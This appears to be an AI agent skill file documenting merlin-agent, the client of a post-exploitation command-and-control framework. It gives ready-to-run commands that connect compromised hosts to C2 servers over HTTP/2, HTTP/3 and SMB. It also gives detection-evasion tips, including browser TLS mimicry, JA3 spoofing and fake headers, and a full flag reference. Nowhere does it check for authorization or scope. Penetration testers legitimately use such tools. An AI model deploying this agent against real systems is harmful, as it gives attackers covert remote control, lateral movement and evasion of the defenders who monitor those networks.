---
name: merlin-agent
description: Deploy a cross-platform post-exploitation HTTP/2 Command & Control agent. Use when establishing a remote connection to a Merlin C2 server, maintaining persistence, or executing post-exploitation tasks over various protocols including HTTP/2, HTTP/3, and SMB.
---

# merlin-agent

## Overview
Merlin-agent is the client-side component of the Merlin post-exploitation Command & Control (C2) framework. It is designed to be cross-platform and supports modern protocols like HTTP/2 and HTTP/3 to evade detection and provide robust communication channels. Category: Post-Exploitation.

## Installation (if not already installed)
Assume the agent is already installed. If the command is missing:

```bash
sudo apt install merlin-agent
```

## Common Workflows

### Connect to a Merlin Server via HTTP/2 (Default)
```bash
merlin-agent -url https://192.168.1.100:443 -psk custompassword
```

### Connect using HTTP/3 (QUIC) with custom sleep and skew
```bash
merlin-agent -url https://c2.example.com:443 -proto http3 -sleep 60s -skew 5000
```

### Stealthy connection with browser mimicking and custom headers
```bash
merlin-agent -url https://c2.example.com:443 -parrot HelloChrome_Auto -headers "X-App-ID: 12345\nReferer: https://google.com"
```

### SMB Bind connection for lateral movement
```bash
merlin-agent -proto smb-bind -addr 0.0.0.0:445
```

## Complete Command Reference

```
merlin-agent [options]
```

### Options

| Flag | Description |
|------|-------------|
| `-addr <string>` | The address in interface:port format the agent will use for communications (default "127.0.0.1:7777") |
| `-auth <string>` | The Agent's authentication method (e.g., OPAQUE) (default "opaque") |
| `-debug` | Enable debug output |
| `-headers <string>` | A new line separated (e.g., \n) list of additional HTTP headers to use |
| `-host <string>` | HTTP Host header |
| `-http-client <string>` | The HTTP client to use for communication [go, winhttp] (default "go") |
| `-ja3 <string>` | JA3 signature string (not the MD5 hash). Overrides -proto & -parrot flags |
| `-killdate <string>` | The date, as a Unix EPOCH timestamp, that the agent will quit running (default "0") |
| `-listener <string>` | The uuid of the peer-to-peer listener this agent should connect to |
| `-maxretry <string>` | The maximum amount of failed checkins before the agent will quit running (default "7") |
| `-padding <string>` | The maximum amount of data that will be randomly selected and appended to every message (default "4096") |
| `-parrot <string>` | Parrot or mimic a specific browser from github.com/refraction-networking/utls (e.g., HelloChrome_Auto) |
| `-proto <string>` | Protocol for the agent to connect with [https (HTTP/1.1), http (HTTP/1.1 Clear-Text), h2 (HTTP/2), h2c (HTTP/2 Clear-Text), http3 (QUIC or HTTP/3.0), tcp-bind, tcp-reverse, udp-bind, udp-reverse, smb-bind, smb-reverse] (default "h2") |
| `-proxy <string>` | Hardcoded proxy to use for http/1.1 traffic only that will override host configuration |
| `-proxy-pass <string>` | Password for proxy authentication |
| `-proxy-user <string>` | Username for proxy authentication |
| `-psk <string>` | Pre-Shared Key used to encrypt initial communications (default "merlin") |
| `-secure <string>` | Require TLS certificate validation for HTTP communications (default "false") |
| `-skew <string>` | Amount of skew, or variance, between agent checkins (default "3000") |
| `-sleep <string>` | Time for agent to sleep (default "30s") |
| `-transforms <string>` | Ordered CSV of transforms to construct a message (default "jwe,gob-base") |
| `-url <string>` | A comma separated list of the full URLs for the agent to connect to (default "https://127.0.0.1:443") |
| `-useragent <string>` | The HTTP User-Agent header string that the Agent will use while sending traffic (default "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36") |
| `-v` | Enable verbose output |
| `-version` | Print the agent version and exit |

## Notes
- **Security**: Always change the default Pre-Shared Key (`-psk`) to prevent unauthorized access to your C2 infrastructure.
- **Evasion**: Use the `-parrot` or `-ja3` flags to make the agent's TLS handshake look like a legitimate web browser.
- **Persistence**: The `-killdate` flag is useful for ensuring the agent automatically stops running after a specific engagement window.
- **Protocol Selection**: HTTP/2 (`h2`) is the default and recommended for most scenarios due to its performance and ability to blend in with modern web traffic.